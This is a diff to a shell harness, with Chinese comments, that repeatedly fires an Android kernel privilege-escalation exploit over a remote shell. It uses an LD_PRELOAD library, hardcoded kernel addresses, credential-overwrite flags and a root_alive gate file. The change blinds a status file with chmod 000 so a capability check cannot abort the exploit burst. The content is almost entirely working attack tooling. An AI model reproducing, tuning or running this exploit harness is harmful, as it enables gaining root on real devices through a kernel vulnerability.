@@ -142,9 +142,9 @@ cleangate(){ local i
   return 1; }
 fire(){ local name="$1" stage="$2" task="$3" te="" rc_line
   [ -n "$task" ] && te=" PSELECT_TASK=$task"
-  if [ -n "$task" ]; then say "[mt63] $name 外部模式: 不清状态文件(活体子进程每200ms在写,它就是写目标)"; rsh "rm -f /data/local/tmp/root_alive.txt" 20 >/dev/null 2>&1; else cleangate || { say "!! $name 门槛文件删不净, 弃打本轮(防陈旧误判)"; return 1; }; fi
+  if [ -n "$task" ]; then say "[mt64] $name 外部模式: 清root_alive+致盲状态文件(mt51发间检查读CapEff,C阶段恒满帽=假阳性中止burst;致盲后C写6发全打,收尾恢复644)"; rsh "rm -f /data/local/tmp/root_alive.txt; chmod 000 /data/local/tmp/mt49_child_status.txt" 20 >/dev/null 2>&1; else cleangate || { say "!! $name 门槛文件删不净, 弃打本轮(防陈旧误判)"; return 1; }; fi
   rsh1 "am kill-all" 20 >/dev/null
-  local cmd="timeout 250 env PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 PSELECT_RETRY=1 PSELECT_PTR_MODE=1 PSELECT_PTR_STAGE=$stage PSELECT_PTR_STRICT=1 PSELECT_PTR_RIGHT=ffffff80027b0ae0 PSELECT_TREE_PC=ffffff8002a41b90 PSELECT_TREE_LEFT=0 PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 PSELECT_NO_CANARY=1$te LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 180 > /data/local/tmp/$name.out 2>&1; echo \"${name}_RC=\$?\""
+  local cmd="timeout 250 env PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 PSELECT_RETRY=1 PSELECT_PTR_MODE=1 PSELECT_PTR_STAGE=$stage PSELECT_PTR_STRICT=1 PSELECT_PTR_RIGHT=ffffff80027b0ae0 PSELECT_TREE_PC=ffffff8002a41b90 PSELECT_TREE_LEFT=0 PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 PSELECT_NO_CANARY=1$te LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 180 > /data/local/tmp/$name.out 2>&1; mtc64rc=\$?; chmod 644 /data/local/tmp/mt49_child_status.txt 2>/dev/null; echo \"${name}_RC=\$mtc64rc\""
   say "开火 $name (约4-5分钟,请勿动手机,保持亮屏)..."
   rc_line=$(rsh1 "$cmd" 280 | grep -a "_RC=" | tail -1)
   if [ -z "$rc_line" ]; then
